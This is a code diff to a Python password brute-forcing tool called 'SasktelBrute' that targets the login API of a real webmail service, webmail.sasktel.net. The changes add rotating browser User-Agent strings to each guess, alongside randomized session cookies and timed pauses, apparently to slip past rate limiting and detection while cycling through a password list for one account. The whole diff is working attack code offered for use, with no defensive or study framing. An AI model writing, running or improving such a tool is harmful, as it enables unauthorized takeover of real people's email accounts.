@@ -4,7 +4,11 @@ import time
 import random
 import string
 
-
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
+]
 def parse_arguments():
     parser = argparse.ArgumentParser(
         prog='SasktelBrute',
@@ -23,20 +27,20 @@ def parse_arguments():
     return user, passwords
 
 
-def generate_random_cookie_part(length=48):  # 64 is just an example length
-    """Generate a random cookie string part of a given length."""
+def generate_random_cookie_part(length=48):
     characters = string.ascii_letters + string.digits + string.punctuation
     cookie_part = ''.join(random.choice(characters) for i in range(length))
     return cookie_part
 
 
-def attack(user, password):
+
+def attack(user, password, user_agent):
     url = 'https://webmail.sasktel.net/api/bf/login/'
     random_part = generate_random_cookie_part()
     cookie_value = f"BIGipServer~C7~C7_PMAIL.0_IPv4_80_POOL=!YR/{random_part},"
     headers = {
         'Host': 'webmail.sasktel.net',
-        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
+        'User-Agent': user_agent,
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'en-CA,en-US;q=0.7,en;q=0.3;',
         'Accept-Encoding': 'gzip, deflate, br',
@@ -80,17 +84,22 @@ if __name__ == '__main__':
     print("Starting the attack...")
 
     attempt_count = 0  
+    user_agent_index = 0  
 
     for password in passwords:
         print(f"Trying password: {password}")
 
-        if attack(user, password):
+        
+        current_user_agent = USER_AGENTS[user_agent_index]
+        user_agent_index = (user_agent_index + 1) % len(USER_AGENTS)
+
+        if attack(user, password, current_user_agent):
             break
 
         time.sleep(2)
         attempt_count += 1  
 
-       
+        
         if attempt_count == 10:
             print("Waiting for 30 seconds...")
             time.sleep(30)
